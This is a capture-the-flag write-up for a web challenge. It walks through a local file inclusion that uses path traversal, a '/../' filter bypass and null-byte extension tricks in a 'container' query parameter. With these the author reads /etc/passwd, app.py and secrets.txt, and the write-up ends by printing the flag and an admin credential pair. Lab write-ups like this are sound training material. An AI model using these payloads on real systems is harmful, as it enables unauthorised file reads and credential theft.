# About
"This is the story of how I defined your schema."
The flag is in secrets.txt

![image](https://github.com/user-attachments/assets/2b26c3d3-b5b2-459f-9174-3be3318c94c2)


# Solve
Based on this and the URLs when making searches, I knew that I would be looking for some sort of LFI to read the flag.
`/select?record=*&container=employees`

![](Images/Pasted%20image%2020250427094326.png)

Which I was able to get working with the following.

```
/select?record=*&container=/etc/passwd
```

Now we just have to get secrets to read.
```
/select?record=*&container=../secrets.txt
```

The above query returned invalid for two reasons, one because the application is doing some form of sanitization for relative paths `../` but could be bypassed with `/../` and issues with the removal of the .txt extension when trying to read the file.

I was able to crash the application to leak more information to confirm some of this with the following search parameters.
```
/select?record=*&container/asd
```

![](Images/Pasted%20image%2020250428111241.png)

After testing some various ways of bypassing the file read I was able to determine a way to get any file type to read.
```
.[EXT].%00
.[EXT].[EXT]
/select?record=*&container=/../../../../app/app.py.py
```

Knowing that I can parse the secrets.txt flag by testing in various directories for the file.
```
/select?record=*&container=/../../../../app/secrets.txt.%00
```

![](Images/Pasted%20image%2020250427130837.png)

```
CIT{235da65aa6444e27} admin:9f3IC3uj9^zZ
```
